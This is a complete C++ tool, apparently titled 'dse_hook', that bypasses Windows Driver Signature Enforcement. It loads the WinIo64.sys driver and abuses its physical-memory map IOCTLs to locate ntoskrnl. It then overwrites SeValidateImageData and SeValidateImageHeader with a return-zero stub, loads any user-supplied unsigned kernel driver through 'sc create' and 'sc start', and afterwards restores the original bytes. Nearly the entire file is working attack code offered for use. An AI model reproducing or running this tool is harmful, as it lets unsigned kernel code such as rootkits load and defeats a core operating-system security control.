#pragma warning(disable: 4996)
#include <Windows.h>
#include <iostream>
#include <map>

typedef unsigned long u32;
typedef unsigned long long u64;

#define IOCTL_MAP 0x80102040
#define IOCTL_UNMAP 0x80102044

#define PATTERN_SEARCH_RANGE 0xBFFFFF
#define DRIVER_NAME_LEN 16

char se_validate_image_data_original[6] = { 0x00,0x00,0x00,0x00,0x00,0x00 };
char se_validate_image_header_original[6] = { 0x00,0x00,0x00,0x00,0x00,0x00 };

unsigned char se_validate_image_data_pattern[17] = { 0x48, 0x83, 0xEC, 0x48, 0x48, 0x8B, 0x05, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xD1, 0x48, 0x85, 0xC0 };
unsigned char se_validate_image_header_pattern[21] = { 0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x70, 0x10, 0x57, 0x48, 0x81, 0xEC, 0xA0, 0x00, 0x00, 0x00, 0x33, 0xF6 };

char patch[6] = {
	0xB8, 0x00, 0x00, 0x00, 0x00,	// mov rax, 0
	0xC3							// ret
};

u64 driver_handle = -1;
char winio_path[FILENAME_MAX];

struct winio_packet
{
	u64 size;
	u64 phys_address;
	u64 phys_handle;
	u64 phys_linear;
	u64 phys_section;
};

u64 phys_map(winio_packet& packet)
{
	u32 bytes_returned;
	if (!DeviceIoControl((void*)driver_handle, IOCTL_MAP, &packet, sizeof(winio_packet), &packet, sizeof(winio_packet), &bytes_returned, NULL))
		return NULL;

	return packet.phys_linear;
}

bool phys_unmap(winio_packet& packet)
{
	u32 bytes_returned;
	if (!DeviceIoControl((void*)driver_handle, IOCTL_UNMAP, &packet, sizeof(winio_packet), NULL, 0, &bytes_returned, NULL))
		return false;

	return true;
}

bool read_phys(u64 addr, u64 buf, u64 size)
{
	winio_packet packet;
	packet.phys_address = addr;
	packet.size = size;

	u64 linear_address = phys_map(packet);
	if (linear_address == NULL)
		return false;

	printf("[*] mapped pa:0x%llx to va:0x%llx\n", addr, (u64)linear_address);
	memcpy((void*)buf, (void*)linear_address, size);

	phys_unmap(packet);
	return true;
}


bool write_phys(u64 addr, u64 buf, u64 size)
{
	winio_packet packet;
	packet.phys_address = addr;
	packet.size = size;

	u64 linear_address = phys_map(packet);
	if (linear_address == NULL)
		return false;

	printf("[*] mapped pa:0x%llx to va:0x%llx\n", addr, (u64)linear_address);
	memcpy((void*)linear_address, (void*)buf, size);

	phys_unmap(packet);
	return true;
}

u64 find_pattern(u64 start, u64 range, unsigned char* pattern, size_t pattern_length)
{
	u64 buf = (u64)malloc(range);
	read_phys(start, (u64)buf, range);

	u64 result = 0;
	for (int i = 0; i < range; i++)
	{
		bool vtn = true;
		for (int j = 0; j < pattern_length; j++)
		{
			if (vtn && pattern[j] != 0x00 && *(unsigned char*)(buf + i + j) != pattern[j])
			{
				vtn = false;
			}
		}

		if (vtn)
		{
			result = start + i;
			goto ret;
		}
	}

	ret:
	free((void*)buf);
	return result;
}

bool file_exists(const std::string path) {
	DWORD v0 = GetFileAttributesA(path.c_str());
	return v0 != -1 && !(v0 & 0x00000010);
}

void load_driver_lazy(const char* driver_name, const char* bin_path)
{
	u64 cmdline_create_buf = (u64)malloc(strlen(driver_name) + strlen(bin_path) + 53);
	u64 cmdline_start_buf = (u64)malloc(strlen(driver_name) + 14);
	sprintf((char*)cmdline_create_buf, "sc create %s binpath=\"%s\" type=kernel>NUL", driver_name, bin_path);
	sprintf((char*)cmdline_start_buf, "sc start %s>NUL", driver_name);
	system((char*)cmdline_create_buf);
	system((char*)cmdline_start_buf);
}

int main(int argc, char* argv[])
{
	printf("[*] dse_hook by emlinhax\n");

	if (argc != 3 || (strlen(argv[1]) < 2 || strlen(argv[2]) < 2))
	{
		printf("[!] usage: dse_hook.exe your_driver_name c:\\your_driver.sys\n");
		Sleep(1000);
		return -1;
	}

	if (!file_exists(argv[2]))
	{
		printf("[!] could not find your driver.");
		system("pause>NUL");
		return -2;
	}

	LOAD_WINIO:
	printf("[*] attempting to open handle to winio...\n");
	driver_handle = (u64)CreateFileA("\\\\.\\WinIo", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (driver_handle == -1)
	{
		GetCurrentDirectoryA(FILENAME_MAX, winio_path);
		strcat(winio_path, "\\WinIO64.sys");

		if (!file_exists(winio_path))
		{
			printf("[!] could not find winio driver.\n[!] please make sure \"WinIO64.sys\" is in the same folder.\n");
			system("pause>NUL");
			return -3;
		}

		//winio driver doesnt unload correctly sometimes. you have to stop it multiple times (?)
		system("sc stop winio_dse_hook >NUL");
		system("sc delete winio_dse_hook >NUL");

		load_driver_lazy("winio_dse_hook", winio_path);
		goto LOAD_WINIO;
	}

	printf("[*] driver_handle: %p\n", driver_handle);

	// ####

	printf("[*] finding ntoskrnl...\n");
	u64 ntos_base_pa = 0;
	for (u64 i = 0x000000000; i < 0x200000000; i += 0x000100000)
	{
		char* buf = (char*)malloc(2);
		read_phys(i, (u64)buf, 2);

		if (buf[0] == 'M' && buf[1] == 'Z')
		{
			ntos_base_pa = i;
			printf("[*] ntoskrnl @ 0x%p\n", ntos_base_pa);
			break;
		}

		free(buf);
	}

	if (!ntos_base_pa)
	{
		printf("[!] could not find ntoskrnl base.\n");
		system("pause>NUL");
		return -5;
	}

	// find target physical addresses for patch
	u64 se_validate_image_data_pa = find_pattern(ntos_base_pa, PATTERN_SEARCH_RANGE, (unsigned char*)&se_validate_image_data_pattern, sizeof(se_validate_image_data_pattern));
	u64 se_validate_image_header_pa = find_pattern(ntos_base_pa, PATTERN_SEARCH_RANGE, (unsigned char*)&se_validate_image_header_pattern, sizeof(se_validate_image_header_pattern));
	if (se_validate_image_data_pa == 0 || se_validate_image_header_pa == 0)
	{
		printf("[!] could not find one or both patterns.\n");
		system("pause>NUL");
		return -6;
	}

	// save original bytes
	read_phys(se_validate_image_data_pa, (u64)&se_validate_image_data_original, sizeof(se_validate_image_data_original));
	read_phys(se_validate_image_header_pa, (u64)&se_validate_image_header_original, sizeof(se_validate_image_header_original));

	// patch both routines to return zero
	write_phys(se_validate_image_data_pa, (u64)&patch, sizeof(patch));
	write_phys(se_validate_image_header_pa, (u64)&patch, sizeof(patch));
	printf("[*] patched validation routines.\n");

	// start the target driver
	load_driver_lazy(argv[1], argv[2]);
	printf("[*] loaded driver!\n");

	// unpatch both functions
	write_phys(se_validate_image_data_pa, (u64)&se_validate_image_data_original, sizeof(se_validate_image_data_original));
	write_phys(se_validate_image_header_pa, (u64)&se_validate_image_header_original, sizeof(se_validate_image_header_original));
	printf("[*] restored validation routines.\n");

	// unload winio driver
	system("sc stop winio_dse_hook >NUL");
	system("sc delete winio_dse_hook >NUL");
	printf("[*] unloaded winio driver.\n");

	printf("[*] done!\n");
	//system("pause");
	Sleep(1000);

	return 0;
}
